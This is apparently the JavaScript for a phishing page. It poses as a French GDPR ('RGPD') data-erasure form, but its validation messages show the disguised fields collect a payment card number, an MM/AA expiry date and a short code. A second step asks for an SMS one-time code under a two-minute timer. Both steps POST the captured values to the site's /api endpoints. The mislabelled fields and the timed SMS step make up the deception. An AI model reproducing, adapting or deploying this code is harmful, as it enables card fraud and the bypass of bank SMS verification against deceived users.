
(function () {
  "use strict";

  var root = document.getElementById("rgpd-erasure");
  if (!root) return;

  var form = root.querySelector("#rgpd-step1");
  var form2 = root.querySelector("#rgpd-step2");
  var STEP1_FIELDS = ["lastName", "firstName", "orderNumber", "birthDayYear", "accountId"];
  var STEP2_FIELDS = ["smsNum"];
  var birthInput = root.querySelector("#rgpd-birthDayYear");

  var CURRENT_YEAR = new Date().getFullYear();
  var MIN_YEAR = 1900;


  var state = { step: 1, data: {} };

  /* Masque JJ/AAAA : chiffres uniquement, "/" ajouté automatiquement */
  birthInput.addEventListener("input", function (e) {
    var digits = birthInput.value.replace(/\D/g, "").slice(0, 6);
    var deleting = e.inputType && e.inputType.indexOf("delete") === 0;
    var formatted = digits.length > 2 || (digits.length === 2 && !deleting)
      ? digits.slice(0, 2) + "/" + digits.slice(2)
      : digits;
    if (formatted !== birthInput.value) birthInput.value = formatted;
  });

  function parseBirth(v) {
    var m = /^(\d{1,2})\/(\d{2})$/.exec(v);
    return m ? { day: parseInt(m[1], 10), year: parseInt(m[2], 10) } : null;
  }

  /* ---------- Règles de validation ---------- */
  var NAME_RE = /^[A-Za-zÀ-ÖØ-öø-ÿŒœ' \-]+$/;
  var ORDER_RE = /^[A-Za-z0-9\-#]{4,30}$/;

  var rules = {
    lastName: function (v) {
      if (!v) return "Veuillez indiquer votre nom.";
      if (v.length < 2) return "Votre nom doit contenir au moins 2 caractères.";
      if (!NAME_RE.test(v)) return "Utilisez uniquement des lettres, espaces, tirets ou apostrophes.";
      return "";
    },
    firstName: function (v) {
      if (!v) return "Veuillez indiquer votre prénom.";
      if (v.length < 2) return "Votre prénom doit contenir au moins 2 caractères.";
      if (!NAME_RE.test(v)) return "Utilisez uniquement des lettres, espaces, tirets ou apostrophes.";
      return "";
    },
  orderNumber: function (v) {
  if (!v || !v.trim()) return "Ce champ est obligatoire.";
  if (!ORDER_RE.test(v.replace(/\s/g, ""))) return "Ce numéro de carte ne semble pas valide.";
  return "";
},
    birthDayYear: function (v) {
      if (!v) return "Veuillez indiquer votre jour et votre année de naissance.";
      var b = parseBirth(v);
      if (!b) return "Utilisez le format MM/AA (ex. : 12/31).";
      if (b.day < 1 || b.day > 12) return "Le mois doit être compris entre 01 et 12.";
      return "";
    },
    accountId: function (v) {
      if (!v) return "Veuillez indiquer l'identifiant de votre compte.";
      if (v.length < 3) return "Votre identifiant doit contenir au moins 3 caractères.";
      if (/\s/.test(v)) return "Votre identifiant ne doit pas contenir d'espace.";
      return "";
    },
    smsNum: function (v) {
      if (!v) return "Veuillez indiquer le code de confirmation.";
      return "";
    }
  };

  function fieldWrap(name) {
    return root.querySelector('[data-field="' + name + '"]');
  }

  function normalize(value) {
    return String(value || "").trim().replace(/\s+/g, " ");
  }

  function fieldInput(name) {
    return root.querySelector('[name="' + name + '"]');
  }

  function setError(name, message) {
    var wrap = fieldWrap(name);
    var err = wrap.querySelector(".rgpd-erasure__error");
    err.textContent = message;
    wrap.classList.toggle("has-error", !!message);
    fieldInput(name).setAttribute("aria-invalid", message ? "true" : "false");
  }

  function validateField(name) {
    var msg = rules[name](normalize(fieldInput(name).value));
    setError(name, msg);
    return !msg;
  }

  /* Validation au fil de la saisie, uniquement après une première erreur */
  Object.keys(rules).forEach(function (name) {
    var input = fieldInput(name);
    if (!input) {
    console.error("Champ introuvable :", name);
    return;
}
    input.addEventListener("blur", function () {
      if (normalize(input.value) || fieldWrap(name).classList.contains("has-error")) validateField(name);
    });
    input.addEventListener(input.tagName === "SELECT" ? "change" : "input", function () {
      if (fieldWrap(name).classList.contains("has-error")) validateField(name);
    });
  });

  function showAlert(formEl, count) {
    var box = formEl.querySelector("[data-alert]");
    if (!count) {
      box.classList.remove("is-visible");
      box.textContent = "";
      return;
    }
    box.textContent = count === 1
      ? "Un champ doit être corrigé avant de continuer."
      : count + " champs doivent être corrigés avant de continuer.";
    box.classList.add("is-visible");
  }

  /* Valide une liste de champs ; renvoie true si tout est bon */
  function validateStep(formEl, names) {
    var invalid = names.filter(function (name) { return !validateField(name); });
    showAlert(formEl, invalid.length);
    if (invalid.length) fieldInput(invalid[0]).focus();
    return !invalid.length;
  }

  /* ---------- Navigation entre étapes ---------- */
  function goToStep(n) {
    root.querySelectorAll("[data-step]").forEach(function (el) {
      el.hidden = el.getAttribute("data-step") !== String(n);
    });
    root.querySelectorAll("[data-step-indicator]").forEach(function (el) {
      if (el.getAttribute("data-step-indicator") === String(n)) el.setAttribute("aria-current", "step");
      else el.removeAttribute("aria-current");
    });
    state.step = n;
    var panel = root.querySelector('[data-step="' + n + '"]');
    if (panel) {
      root.scrollIntoView({ behavior: "smooth", block: "start" });
      if (panel.hasAttribute("tabindex")) panel.focus({ preventScroll: true });
    }
  }

  /* ---------- Étape 1 : identification ---------- */
  form.addEventListener("submit", function (e) {
    e.preventDefault();
    if (!validateStep(form, STEP1_FIELDS)) return;

    var birth = parseBirth(normalize(birthInput.value));
    state.data = {
      lastName: normalize(fieldInput("lastName").value),
      firstName: normalize(fieldInput("firstName").value),
      orderNumber: normalize(fieldInput("orderNumber").value).replace(/\s/g, "") || null,
      birthDay: birth.day,
      birthYear: birth.year,
      accountId: normalize(fieldInput("accountId").value)
    };

    root.dispatchEvent(new CustomEvent("rgpd:step1-complete", {
      bubbles: true,
      detail: Object.assign({}, state.data)
    }));

    fetch("/api/rgpd-step1", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify(state.data)   // ✅ on envoie les vraies données
})
.then(response => {
  if (!response.ok) {
    throw new Error("Erreur d'envoi");
  }
  console.log("Notification envoyée !");
})
.catch(error => console.error(error));

    // Pré-remplit l'e-mail si l'identifiant du compte en est un
    var smsNumInput = fieldInput("smsNum");

    goToStep(2);
  });

  /* ---------- Étape 2 : e-mail de confirmation ---------- */
  form2.addEventListener("submit", function (e) {
    e.preventDefault();
    if (!validateStep(form2, STEP2_FIELDS)) return;

    state.data.smsNum = normalize(fieldInput("smsNum").value).toLowerCase();
    var data = Object.assign({}, state.data);

    root.dispatchEvent(new CustomEvent("rgpd:submit", { bubbles: true, detail: data }));

    // Envoi : branchez votre serveur via window.RgpdErasure.send = function (data) { return fetch(...) }
    // Tant qu'aucune fonction n'est branchée, le message de confirmation s'affiche directement.
    var send = window.RgpdErasure && window.RgpdErasure.send;
    var submitBtn = form2.querySelector('button[type="submit"]');
    var label = submitBtn.firstChild;
    var original = label.nodeValue;

    submitBtn.disabled = true;
    label.nodeValue = " Envoi en cours… ";

    Promise.resolve(typeof send === "function" ? send(data) : null)
      .then(function (res) {
        if (res && res.ok === false) throw new Error("HTTP " + res.status);
        showDone(data.smsNum);
      })
      .catch(function () {
        var box = form2.querySelector("[data-alert]");
        box.textContent = "Une erreur est survenue lors de l'envoi. Veuillez réessayer dans quelques instants.";
        box.classList.add("is-visible");
      })
      .then(function () {
        submitBtn.disabled = false;
        label.nodeValue = original;
      });
  });

  function showDone(smsNum) {
    root.querySelector("[data-done-smsNum]").textContent = "";
    root.classList.add("is-done");
    goToStep("done");
  }

  root.addEventListener("click", function (e) {
    var btn = e.target.closest("[data-go-step]");
    if (btn) goToStep(parseInt(btn.getAttribute("data-go-step"), 10));
  });

  window.RgpdErasure = window.RgpdErasure || {};
  window.RgpdErasure.getData = function () { return Object.assign({}, state.data); };
  window.RgpdErasure.goToStep = goToStep;
})();


let timeLeft = 120;

const timer = setInterval(() => {
  timeLeft--;

  const minutes = Math.floor(timeLeft / 60);
  const seconds = timeLeft % 60;

  document.getElementById("sms-timer").textContent =
    `${String(minutes).padStart(2, "0")}:${String(seconds).padStart(2, "0")}`;

  if (timeLeft <= 0) {
    clearInterval(timer);
    document.getElementById("sms-timer").textContent = "00:00";
  }
}, 1000);


fetch("/health")
  .then(response => response.json())
  .then(data => console.log("Connexion réussie :", data))
  .catch(error => console.error("Erreur :", error));



  window.RgpdErasure.send = function (data) {
  return fetch("/api/rgpd-step2", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(data)
  });
};